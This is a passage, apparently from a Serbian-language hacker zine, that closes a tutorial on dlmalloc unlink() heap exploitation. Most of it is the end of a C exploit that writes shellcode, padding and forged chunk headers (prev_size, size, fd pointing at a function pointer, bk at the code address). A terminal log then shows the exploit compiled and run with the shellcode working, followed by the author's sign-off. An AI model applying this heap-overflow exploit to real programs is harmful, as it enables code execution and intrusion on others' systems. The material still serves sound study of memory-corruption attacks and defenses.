+        /* sp3cial h3llc0d3z */
+        memcpy( p, shellcode, strlen(shellcode) );
+        p += strlen( shellcode );
+        /* djubre */
+        memset( p, 'B', (680 - 4*4) - (2*4 + strlen(shellcode)) );
+        p += ( 680 - 4*4 ) - ( 2*4 + strlen(shellcode) );
+        /* prev_size drugog chunka */
+        *( (size_t *)p ) = (size_t)( DUMMY & ~PREV_INUSE );
+        p += 4;
+        /* size drugog chunka */
+        *( (size_t *)p ) = (size_t)( -4 );
+        p += 4;
+        /* fd drugog chunka */
+        *( (void **)p ) = (void *)( FUNCTION_POINTER - 12 );
+        p += 4;
+        /* bk drugog chunk */
+        *( (void **)p ) = (void *)( CODE_ADDRESS );
+        p += 4;
+        /* Presveti NUL koji terminira string, svi se poklonite! */
+        *p = '\0';
+       
+        execve( argv[0], argv, NULL ); //t00 l33t t0 und3rs4nd :)
+        return( -1 );
+}
+ 
+
+      E sad se samo nadam da ce da radi :)
+
+            Ajd` da vidimo i to cudo:
+
+
+earthquake@ono-sendai:~$ gcc expl.c -o expl
+earthquake@ono-sendai:~$ ./expl 
+0x80496d0
+ANisp2.doc  MallocDemistified.txt        expl.c    siddhartha.pdf
+Desktop     MallocDemistified.txt~       install   vuln
+Downloads   baumann-hesse-and-india.pdf  lida      vuln.c
+Mail        expl                         projects
+earthquake@ono-sendai:~$ 
+
+      Woah, moj ub3rl33t sh3llc0d3 radi!!! Jako cudno, ovo nebi trebalo da radi na
+novijim glibc verzijama ali ocigledno radi:). Naime nisam ni mislio da ce 
+unlink() tehnika da radi kod mene, opisao sam je jer je to osnova ostalih, ali 
+se ispostavilo da radi.
+      Tol`ko o unlink() tehnici. Nadam se da sam je dovoljno dobro objasnio. 
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 4. Odvod
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+      
+      Ovaj tekst je ima i drugi deo. On opisuje novije tehnike dlmalloc 
+eksploitacije opisane u MallocMaleficarum tekstu. Kako su tehnike prilicno 
+komplikovane, a od strane mene jako jako ruzno objasnjene sumnjam da bi ih iko 
+iz mog opisa skapirao. Zato sam taj deo teksta izbacio da ceka da ga doradim i 
+pojasnim stvari bolje. To bolje objasnjavanje bi zahtevalo dodatna objasnjavanja 
+sigurnosnih dodataka u skroijim verzijama glibca koje moram priznati ni sam 
+neznam dovoljno dobro, a posto zine izlazi sutra nemam vremena da im se za tako 
+kratko vreme posvetim. Naravno, za to je kriva moja lenjost i nista drugo. 
+Vracam  se temi u sledecem broju. Na ovaj deo teksta gledajte kao na uvod u 
+malloc eksplitaciju, kao pocetak za dalje ucenje. Bar ga ja tako vidim.
+Ako neko ima nesto da mi kaze, bilo sta, ima moj mail i nek slobodno pise, a 
+moze i povremeno da me nadje na irc.pulltheplug.org kanal #social. 
+
+
+      Anywayz, tol`ko od mene za ovaj put.
+
+
+
+
